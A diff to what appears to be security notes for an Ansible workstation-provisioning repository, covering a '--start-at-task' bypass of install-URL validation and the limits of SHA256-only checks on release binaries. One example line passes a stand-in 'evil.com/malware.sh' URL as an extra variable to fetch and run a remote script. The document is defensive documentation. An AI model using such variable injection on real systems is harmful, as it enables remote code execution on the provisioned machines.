@@ -359,7 +359,7 @@ git commit --no-verify -m "Skip hooks"  # DO NOT DO THIS
 
 **Do NOT use `--start-at-task` with site.yml** — Ansible's `--start-at-task` flag
 skips all `pre_tasks` in the target play, including critical security validations.
-The pre-flight checks (`common/tasks/pre_flight_checks.yml`) validate `claude_install_url`
+The claude role (`roles/claude/tasks/main.yml`) validates `claude_install_url`
 is constrained to safe domains (`claude.ai` or `anthropic.com`). Using
 `--start-at-task` with any task name would bypass this validation, allowing
 `-e 'claude_install_url=https://evil.com/malware.sh'` to inject and execute
@@ -600,20 +600,18 @@ upgrade procedure and mandatory review checklist.
   when it matches `claude_install_sha256` (with `claude_pinned_version` as a minimum
   version); the binaries it fetches come from Anthropic's rolling release channel and are
   not pinned by this repo
-- **SHA256-only verification for tkn, ec, and operator-sdk** — Three work-profile
-  binaries (tkn, ec, operator-sdk) use SHA256 checksum verification without cryptographic
-  signatures or Sigstore attestations. **tkn** (Tekton CLI): tektoncd/cli releases publish
+- **SHA256-only verification for release binaries** — Work-profile binaries (tkn, ec,
+  operator-sdk, sops, actionlint, zizmor) use pinned SHA256 checksum verification without
+  signature, Sigstore or attestation checks. **tkn** (Tekton CLI): tektoncd/cli releases publish
   only plain `checksums.txt` with no cosign bundles or GPG signatures. **ec** (Enterprise
   Contract CLI): conforma/cli releases publish only plain `.sha256` files with no Sigstore
-  attestations. **operator-sdk**: operator-framework/operator-sdk releases publish GPG-signed
-  `checksums.txt.asc` but the playbook does not yet verify GPG signatures (no public key
-  pinning). In contrast, properly verified binaries (cosign, actionlint, zizmor) use
-  full cosign bundle verification or GitHub attestation via `gh CLI`; sops is SHA256-pinned only. SHA256-only verification
+  attestations. cosign upgrades on re-provision still verify the Sigstore bundle with the
+  existing binary. SHA256-only verification
   defends against CDN corruption but NOT against a compromised GitHub releases CDN or
   maintainer account (attacker can upload matching binary + updated SHA256 pair). Mitigation:
   inspect upstream releases manually in high-security environments before updating SHA256
   values in `roles/packages/defaults/main.yml`. See `roles/packages/tasks/install_standalone_binaries.yml`
-  TODO comments at lines 748 (tkn) and 785 (ec) for upstream tracking.
+  TODO comments (tkn, ec) for upstream tracking.
 - **Secure Boot + GRUB bootloader password (CIS 1.4.2)** — Kernel `lockdown=integrity`
   without Secure Boot is weakened by an unprotected GRUB bootloader. Ansible now enforces GRUB
   superuser password protection (opt-in via `system_grub_password_enabled` in config.yml) to prevent
